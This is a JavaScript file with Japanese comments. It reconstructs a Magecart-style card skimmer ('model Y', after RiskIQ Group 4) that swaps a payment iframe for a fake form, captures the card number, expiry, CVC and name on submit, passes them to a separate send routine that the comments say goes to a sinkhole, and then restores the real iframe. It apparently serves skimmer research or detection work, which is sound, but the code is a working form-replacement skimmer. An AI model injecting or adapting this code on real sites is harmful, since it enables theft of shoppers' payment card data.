'use strict';
// スキマー モデルY の取得部（D26、D27。RiskIQ Group 4 の方式: 決済フォームを偽フォームに置き換える）。
// 流れ（D25）: PSP の iFrame を偽フォームに置換 → 偽フォームの送信で入力を取得し、送信部（send.js）で sinkhole へ
// → 本物の PSP の iFrame を出し直す（顧客がもう一度入力し、正規送信は無改造の iFrame から出る）。
// 入力値の検証・タイマー・決済ページ判定・後始末は再現しない（D33）。
(function () {
  var iframe = document.querySelector('iframe');
  if (!iframe) return;
  var src = iframe.getAttribute('src');
  var form = document.createElement('form');
  form.id = 'skim-form';
  form.autocomplete = 'off';
  [['cardnumber', 'card number'], ['exp', 'MM/YY'], ['cvc', 'CVC'], ['name', 'name']].forEach(function (f) {
    var input = document.createElement('input');
    input.id = 'skim-' + f[0]; input.name = f[0]; input.placeholder = f[1];
    form.appendChild(input);
  });
  var button = document.createElement('button');
  button.id = 'skim-pay'; button.type = 'submit'; button.textContent = 'pay';
  form.appendChild(button);
  iframe.replaceWith(form);

  form.addEventListener('submit', function (ev) {
    ev.preventDefault();
    var pairs = [];
    form.querySelectorAll('input').forEach(function (el) { pairs.push([el.name, el.value]); });
    window.__skimmerSend(pairs);
    var fresh = document.createElement('iframe'); // 本物の iFrame を出し直す
    fresh.setAttribute('src', src);
    form.replaceWith(fresh);
  });
})();
